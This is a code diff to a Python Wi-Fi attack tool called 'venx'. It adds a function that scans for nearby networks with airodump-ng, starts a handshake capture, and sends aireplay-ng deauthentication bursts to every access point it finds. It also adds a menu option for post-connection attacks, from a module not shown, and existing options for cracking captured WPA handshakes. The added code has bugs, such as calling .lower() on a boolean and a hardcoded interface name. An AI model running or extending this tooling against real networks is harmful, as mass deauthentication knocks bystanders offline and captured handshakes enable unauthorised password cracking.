@@ -4,6 +4,7 @@ from src.intro import intro,intro2,intro3
 from src.intro import intro4,intro5,intro6
 from src.intro import intro7,intro8,intro9
 from src.intro import intro10
+from post_connection import post_connection
 
 if os.geteuid() != 0:
     print("\033[0;31m")
@@ -275,6 +276,92 @@ class venx:
             except Exception as e:
                 print(f"Error: {str(e)}")
 
+    def get_handshake_of_all(self):
+        if self.card["mode"] != "Monitor":
+            print(f"{cs.bold_red} Monitor mode needed for this")
+            print(f"{cs.bold_blue}Put your card into 'Monitor' mode in main menu")
+            time.sleep(3)
+            self.clear_screen()
+            self.screen=self.show_wpa_attacks_menu()
+        else:
+            card_name=self.card["name"]
+            try:
+                # Run airodump-ng in a separate xterm terminal and redirect output to a file
+                print(f"{cs.bold_pink}Close the window when you see enaugh wifi's.")
+                command = f"xterm -geometry '100x30+600+0' -e bash -c 'airodump-ng --output-format csv -w temporary/output_file {card_name}'"
+                subprocess.run(command, shell=True)
+
+                # Wait for a moment to ensure the process is running and producing output
+                time.sleep(1)
+                self.clear_screen()
+                self.show_navbar()
+                # Read the contents of the output file
+                with open('temporary/output_file-01.csv', 'r') as file:
+                    output_lines = file.readlines()
+                # Print each line
+                index=0
+                for line in output_lines:
+                    if "Station MAC" in line.split(','):
+                        final_line_index=output_lines.index(line)
+                self.wifi_list=[]
+                for line in output_lines:
+                    if line.strip() == '':
+                        continue
+                    if "BSSID" in line.split(','):
+                        continue
+                    if output_lines.index(line)<final_line_index-1:
+                        words=line.split(',')
+                        bssid=words[0]
+                        essid=words[13]
+                        channel=words[3]
+                        data={
+                            "essid": essid,
+                            "bssid": bssid,
+                            "channel": channel
+                        }
+                        self.wifi_list.append(data)
+                        index+=1
+                subprocess.run(["rm","temporary/output_file-01.csv"])
+                for wifi in self.wifi_list:
+                    essid=wifi["essid"]
+                    bssid=wifi["bssid"]
+                    channel=wifi["channel"]
+                    index=self.wifi_list.index(wifi)
+                    print(f"{cs.bold_blue}{index}. {essid}   BSSID: {bssid}  CHANNEL: {channel} ")
+                print(f"{cs.bold_green}Enter number of the wifi.")
+                print('\n')
+                print(f"Do you want to attack all these wifi's?(y/n):")
+                choice = self.get_input()
+                choice_is_set=False
+                while choice_is_set ==False:
+                    if choice.lower() == 'y':
+                        hs_name=input(f"{cs.bold_blue}give a name to handshake: ")
+                        self.path_to_hs=self.hs_dir+hs_name+'-01.cap'
+                        path_to_hs=f"{self.hs_dir}{hs_name}"
+                        card_name=self.card["name"]
+                        command = f"xterm -geometry '100x25+900+0' -e bash -c 'airodump-ng  --output-format cap -w {path_to_hs} {card_name}'"
+                        subprocess.Popen(command, shell=True)
+                        for wifi in self.wifi_list:
+                            bssid=wifi["bssid"]
+                            channel=wifi["channel"]
+                            subprocess.run(["iwconfig","wlan0", "channel",channel])
+                            time.sleep(0.2)
+                            command2 = f"xterm -geometry '100x25+200+0' -hold -e bash -c 'aireplay-ng --deauth 20 -a {bssid}  {card_name}'"
+                            subprocess.Popen(command2, shell=True)
+
+
+                        choice_is_set = True
+                    elif choice_is_set.lower() == 'n':
+                        self.clear_screen()
+                        self.show_wpa_attacks_menu()
+                        choice_is_set=True
+                    else:
+                        choice_is_set=False
+
+            except Exception as e:
+                print(f"Error: {str(e)}")
+
+
     def crack_hs_password(self):
         if self.path_to_hs != '':
             print(f"{cs.warning_yellow}Type 0(zero) to continue with already captured or set hadshake file.")
@@ -438,7 +525,7 @@ class venx:
     # Attack menues here
     def show_wpa_attacks_menu(self):
         self.show_navbar()
-        options=["Back to main menu","Exit script","Get handshake","Crack existing handshake","Get handshake and crack"]
+        options=["Back to main menu","Exit script","Get handshake --> single target","Crack existing handshake","Get handshake and crack","Get handshake of all --> multiple targetts"]
         for i in options:
             print(f"{cs.bold_blue}{options.index(i)}. {i}")
         print("\n")
@@ -449,20 +536,24 @@ class venx:
                 if choise == 0:
                     self.clear_screen()
                     self.show_main_menu()
-                if choise == 1:
+                elif choise == 1:
                     self.exit_script()
-                if choise == 2:
+                elif choise == 2:
                     self.get_handshake()
-                if choise == 3:
+                elif choise == 3:
                     self.crack_hs_password()
-                if choise == 4:
+                elif choise == 4:
                     self.get_hs_and_crack()
+                elif choise == 5:
+                    self.get_handshake_of_all()
+                
+
 
     # Main menues and main function here
     def show_main_menu(self):
         self.show_navbar()
         options=["Exit script","Put card into monitor mode","Put card into managed mode",
-                 "Select another card","WPA/WPA2 attacks menu"]
+                 "Select another card","WPA/WPA2 attacks menu", "Post-connection attacks menu"]
         for i in options:
             print(f"{cs.bold_blue}{options.index(i)}. {i}")
         print("\n")
@@ -481,6 +572,9 @@ class venx:
                 elif choise == 4:
                     self.clear_screen()
                     self.show_wpa_attacks_menu()
+                elif choise == 5:
+                    self.clear_screen()
+                    post_connection().main()
                     
             else:
                 print(f"{cs.bold_red}Wrong Input!")
